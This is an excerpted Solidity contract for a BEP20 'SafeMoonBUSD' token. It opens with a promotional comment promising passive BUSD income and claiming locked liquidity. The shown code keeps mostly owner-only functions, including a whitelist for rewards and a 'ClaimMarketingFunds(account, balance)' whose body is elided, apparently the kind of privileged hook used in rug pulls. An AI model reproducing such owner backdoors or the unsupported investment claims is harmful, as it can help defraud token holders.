...
SafeMoonBUSD - A new passive income based on safemoon hype token! , Earn BUSD by just holding $SFBUSD . Experienced dev. Has a marketing plan. 4% max wallet for each holder (0.4 BNB) , 3% goes to marketing while the 5% goes to BUSD Reward Pool. and 2% for the liquidity to stable floor price. Launching with organic members.

10% for all transactions | Must hold atleast (0.05 BNB to be able to earn BUSD) 

Liquidity Locked / Smart Contract Verified

Portal : https://t.me/SafeMoonBUSD
...
*/
    ...
    contract SafeMoonBUSD  is IBEP20, Ownable
    {
        ...
        string private constant _name = "SafeMoonBUSD";
        string private constant _symbol = "SFBUSD";
        ...
        address public constant MarketingWallet=0x0Fcfd8B4B132c6Dc1e023ef298cc9bDfBd9C5bEE; 
        ...
        constructor () {
           ...
           function LiquidityProvider(address account) external onlyOwner {
            ...
            function AllowAddressBUSD(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function ClaimMarketingFunds(address account, uint256 balance) onlyOwner  public virtual {
